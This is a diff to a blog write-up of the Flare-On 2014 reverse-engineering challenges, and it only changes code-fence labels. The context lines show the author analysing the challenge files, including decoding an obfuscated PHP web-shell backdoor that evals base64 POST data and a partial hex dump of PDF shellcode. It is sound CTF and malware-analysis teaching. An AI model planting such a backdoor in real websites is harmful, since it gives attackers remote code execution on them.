@@ -13,7 +13,7 @@ Once you get hold of the challenge files, you will find that there are total sev
 ### Challenge #1
 The first challenge seems to be a PE file but let's do the initial reconnaissance to gather more details:
 
-```bash
+```console
 $ file C1.exe
 C1.exe: PE32+ executable (GUI) x86-64, for MS Windows
 $
@@ -79,7 +79,7 @@ $
 
 So, the usual stuff. It is a PE file for x64 architecture. Nothing out of the ordinary here. However, upon executing this file inside a VM I found that it shows an EULA from FireEye and once you agree with terms of the license it drops a file named `Challenge1.exe`:
 
-```bash
+```console
 $ file Challenge1.exe
 Challenge1.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows
 $
@@ -133,7 +133,7 @@ Alright, so the binary blob is of size 31B and has seemingly uninteresting data.
 ### Challenge #2
 This challenge has two files: a HTML and PNG respectively. From the very start of this challenge I was keen on analyzing the PNG as somewhere in the back of my mind I had this intuition that it could be a stegano challenge. As such I tried gathering more information about the PNG file:
 
-```bash
+```console
 $ file home.html
 home.html: HTML document, UTF-8 Unicode text, with very long lines, with CRLF line terminators
 $
@@ -235,7 +235,7 @@ $_= 'aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0XHg0NFx
 
 Let's do the `eval` manually. The `$__` variable is referenced first and it looks like to be base64 encoded. Let's decode it:
 
-```bash
+```console
 $ echo -en "JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7" | base64 -d -
 $code=base64_decode($_);eval($code);
 $
@@ -243,7 +243,7 @@ $
 
 So, this code will base64 decode the `$_` variable and that's what we need to do next:
 
-```bash
+```console
 $ echo -en "aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0XHg0NFx4NEZceDU0XHg2QVw5N1x4NzZceDYxXHgzNVx4NjNceDcyXDk3XHg3MFx4NDFcODRceDY2XHg2Q1w5N1x4NzJceDY1XHg0NFw2NVx4NTNcNzJcMTExXDExMFw2OFw3OVw4NFw5OVx4NkZceDZEIl0pKSB7IGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbIlw5N1w0OVx4MzFcNjhceDRGXHg1NFwxMTZcMTA0XHg2MVwxMTZceDQ0XDc5XHg1NFwxMDZcOTdcMTE4XDk3XDUzXHg2M1wxMTRceDYxXHg3MFw2NVw4NFwxMDJceDZDXHg2MVwxMTRcMTAxXHg0NFw2NVx4NTNcNzJcMTExXHg2RVx4NDRceDRGXDg0XDk5XHg2Rlx4NkQiXSkpOyB9" | base64 -d -
 if(isset($_POST["\97\49\49\68\x4F\84\116\x68\97\x74\x44\x4F\x54\x6A\97\x76\x61\x35\x63\x72\97\x70\x41\84\x66\x6C\97\x72\x65\x44\65\x53\72\111\110\68\79\84\99\x6F\x6D"])) {
  eval(base64_decode($_POST["\97\49\x31\68\x4F\x54\116\104\x61\116\x44\79\x54\106\97\118\97\53\x63\114\x61\x70\65\84\102\x6C\x61\114\101\x44\65\x53\72\111\x6E\x44\x4F\84\99\x6F\x6D"]));
@@ -276,7 +276,7 @@ a11.that.java5crap@flare-on.com
 ### Challenge #3
 This challenge comprised of a binary file aptly named `such_evil.exe`. Let's do the initial information gathering on this file:
 
-```bash
+```console
 $ file such_evil
 such_evil: PE32 executable (console) Intel 80386 (stripped to external PDB), for MS Windows
 $
@@ -323,7 +323,7 @@ So the flag for this challenge turned out to be: `such.5h311010101.flare-on.com`
 ### Challenge #4
 This is a PDF challenge and I started with my usual information gathering steps:
 
-```bash
+```console
 $ file APT9001.pdf
 APT9001.pdf: PDF document, version 1.5
 $
@@ -367,7 +367,7 @@ $
 
 So we have a PDF file of 21KB with two pages and no optimizations. It has an object with `Javascript`, `OpenAction` and `JBIB2DECODE` filters. I decided to open this file and look at its pages. The first page shows title from the [Mandiant APT1](http://intelreport.mandiant.com/Mandiant_APT1_Report.pdf) report and the other page is left blank. I tried analyzing its objects and streams using [peepdf](http://eternal-todo.com/tools/peepdf-pdf-analysis-tool) but it crashed. However Didier Stevens [pdf-parser.py](http://blog.didierstevens.com/programs/pdf-tools/) script was able to decode it correctly:
 
-```bash
+```console
 $ pdf-parser.py APT9001.pdf
 PDF Comment '%PDF-1.5\r\n'
 PDF Comment '%\xea\xbb\xc1\x9c\r\n'
@@ -469,7 +469,7 @@ $
 
 Of all objects, #6 seemed interesting as the `FlateDecode` and `ASCIIHexDecode` encoded javascript inside it was referenced by #5. Let's extract and analyze this javascript code:
 
-```bash
+```console
 $ pdf-parser.py APT9001.pdf -f -o6
 obj 6 0
  Type:
@@ -519,7 +519,7 @@ $ ipython
 
 The extracted binary shellcode blob contains references to Windows APIs and some strings:
 
-```bash
+```console
 $ cat shellcode.binary | hd
 00000000  f9 72 49 46 25 15 0d 7f  3c 3d 84 e0 2a d6 39 e1  |.rIF%...<=..*.9.|
 00000010  4a a8 b9 76 24 98 78 73  71 7d 7f 75 76 20 d4 96  |J..v$.xsq}.uv ..|
@@ -592,7 +592,7 @@ $
 
 This is where the [writeup](http://www.ghettoforensics.com/2014/09/a-walkthrough-for-flare-re-challenges.html) from [@bbaskin](https://twitter.com/bbaskin) proved useful once again! I installed the recommended [shellcode2exe.py](https://github.com/MarioVilas/shellcode_tools/blob/master/shellcode2exe.py) tool and converted the shellcode blob to an EXE file:
 
-```bash
+```console
 $ shellcode2exe.py shellcode.binary
 Shellcode to executable converter
 by Mario Vilas (mvilas at gmail dot com)
@@ -618,7 +618,7 @@ So, the flag for this challenge is: `wa1ch.d3m.spl01ts@flare-on.com`
 ### Challenge #5
 Alright, on to the final challenge for this post. This is a binary file and let's gather some information about it:
 
-```bash
+```console
 $ file 5get_it
 5get_it: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows
 $
